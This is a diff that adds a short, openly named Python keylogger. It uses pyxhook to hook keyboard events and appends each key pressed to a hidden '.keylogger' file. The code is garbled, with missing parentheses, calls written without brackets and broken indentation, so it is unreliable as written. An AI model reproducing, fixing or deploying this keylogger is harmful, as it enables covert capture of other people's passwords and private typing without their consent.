@@ -1,0 +1,14 @@
+def newline:
+	file = open'.keylogger', 'a'
+	file.write'\n'
+	file.close
+def key_press_eventevent:
+	    with open'.keylogger', 'a+' as File:
+	    	File.writeevent.Key
+        newline
+        newline
+	hookman = pyxhook.HookManager
+	hookman.HookKeyboard
+	hookman.start
+	    time.sleep0.1
+	hookman.cancel
